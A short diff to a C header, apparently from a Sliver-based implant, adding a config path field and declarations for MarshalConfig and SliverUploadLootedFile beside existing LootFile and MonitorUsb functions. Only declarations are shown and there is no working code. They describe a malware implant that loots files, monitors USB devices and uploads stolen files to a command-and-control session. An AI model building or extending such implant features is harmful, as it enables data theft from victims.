@@ -48,6 +48,7 @@ typedef enum {
 } ImplantType;
 
 struct _GLOBAL_CONFIG {
+	LPWSTR lpConfigPath;
 	CHAR szSessionID[33];
 	CHAR PivotSessionID[16];
 	LPSTR lpSliverName;
@@ -257,6 +258,11 @@ PBYTE HeaderMAC
 
 UINT64 GeneratePeerID();
 
+VOID MarshalConfig
+(
+	_In_ PGLOBAL_CONFIG pConfig
+);
+
 PGLOBAL_CONFIG UnmarshalConfig
 (
 	_In_ LPWSTR lpConfigPath
@@ -290,4 +296,9 @@ VOID LootFile
 VOID MonitorUsb
 (
 	_In_ PGLOBAL_CONFIG pConfig
+);
+
+VOID SliverUploadLootedFile
+(
+	_In_ PSLIVER_SESSION_CLIENT pSession
 );
